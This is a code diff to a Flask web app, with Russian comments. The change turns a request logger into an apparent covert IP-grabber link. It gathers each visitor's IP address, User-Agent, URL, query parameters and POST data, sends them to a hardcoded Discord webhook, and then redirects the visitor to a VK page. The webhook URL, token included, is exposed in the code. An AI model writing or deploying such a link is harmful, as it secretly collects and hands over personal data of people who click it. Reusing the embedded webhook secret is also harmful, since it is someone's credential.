@@ -1,6 +1,10 @@
 from flask import Flask, request, jsonify, redirect
+import requests
+import json
 
 app = Flask(__name__)
+
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1271875228288417884/de1_nBQiesIYCzbtm2HC91U3gOdt3_a-IyqfZDw5aKX4rRU46T-dArcn4ccb7RPv4ODF"
 
 @app.route('/')
 def index():
@@ -36,9 +40,30 @@ def index():
         "post_data": post_data
     }
 
-    # Выводим информацию в консоль
-    print("Request Information:")
-    print(jsonify(request_info).get_data(as_text=True))
+    # Подготовка данных для отправки в Discord
+    discord_data = {
+        "content": "Request Information",
+        "embeds": [{
+            "title": "New Request Information",
+            "fields": [
+                {"name": "Client IP", "value": client_ip, "inline": False},
+                {"name": "User-Agent", "value": user_agent, "inline": False},
+                {"name": "Request Method", "value": request_method, "inline": False},
+                {"name": "Request URL", "value": request_url, "inline": False},
+                {"name": "Query Parameters", "value": json.dumps(query_params, indent=2), "inline": False},
+                {"name": "Post Data", "value": json.dumps(post_data, indent=2) if post_data else "None", "inline": False}
+            ]
+        }]
+    }
+
+    # Отправляем данные в Discord
+    response = requests.post(DISCORD_WEBHOOK_URL, json=discord_data)
+
+    # Проверяем успешность отправки
+    if response.status_code == 204:
+        print("Информация успешно отправлена в Discord")
+    else:
+        print(f"Ошибка отправки в Discord: {response.status_code} - {response.text}")
 
     # Перенаправляем пользователя на другой URL
     return redirect('https://vk.com/1mi_musulmane_s_nami_bog')
